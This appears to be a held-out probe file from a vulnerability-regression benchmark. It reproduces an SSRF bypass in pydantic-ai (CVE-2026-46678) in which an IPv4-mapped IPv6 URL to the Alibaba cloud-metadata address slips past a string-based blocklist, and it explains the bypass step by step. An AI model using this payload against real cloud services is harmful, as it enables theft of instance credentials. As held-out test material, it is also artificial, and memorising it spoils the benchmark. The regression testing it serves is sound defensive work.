#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-46678 residual — IPv6-transition-form bypass of the CVE-2026-25580 guard.

The CVE-2026-25580 fix (present on V1 = pydantic-ai 1.56.0) gates the download sink behind
`safe_download()`. Its cloud-metadata check is a STRING-set membership test with no normalization:

    _CLOUD_METADATA_IPS = frozenset({'169.254.169.254', 'fd00:ec2::254', '100.100.100.200'})
    def is_cloud_metadata_ip(ip_str): return ip_str in _CLOUD_METADATA_IPS

So an attacker encodes the metadata IP in an IPv6 transition form. This probe uses the IPv4-mapped
IPv6 form of the Alibaba metadata IP:

    target_url = http://[::ffff:100.100.100.200]/   (allow_local=True, i.e. force_download='allow-local')

    - is_cloud_metadata_ip('::ffff:100.100.100.200') -> string not in the set -> False (NOT blocked).
    - is_private_ip() is SKIPPED because allow_local=True (the CVE-2026-46678 precondition).
    - safe_download then fetches http://[::ffff:100.100.100.200]/, which dual-stack kernels route
      over IPv4 to 100.100.100.200 -> reaches the internal canary and exfiltrates ${PCB_FLAG}.

This is exactly GHSA-cqp8-fcvh-x7r3 (CVE-2026-46678): "the cloud-metadata blocklist could be
bypassed by encoding the metadata IP in an IPv6 transition form (IPv4-mapped IPv6, 6to4, or NAT64)".

CVE-2026-46678 fix (V2 = 1.99.0) adds `_normalize_ip()`, which unwraps IPv4-mapped/6to4/NAT64 to
the embedded IPv4 BEFORE the blocklist check -> '::ffff:100.100.100.200' normalizes to
100.100.100.200 -> is_cloud_metadata_ip True -> rejected (no flag).

Contract: reaches the canary on V1; closed on V2.
"""
from __future__ import annotations

# IPv4-mapped IPv6 form of metadata IP 100.100.100.200. V1's string blocklist misses it and,
# with allow_local=True, the private-IP check is skipped -> fetch reaches the canary. V2 normalizes
# the transition form back to the IPv4 metadata IP -> rejected.
TARGET_URL = "http://[::ffff:100.100.100.200]/"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-46678-ipv4mapped-ipv6-metadata",
        "method": "GET",
        "endpoint": "/fetch",
        "target_url": TARGET_URL,
        "allow_local": True,
    }


if __name__ == "__main__":
    print(candidate()["target_url"])
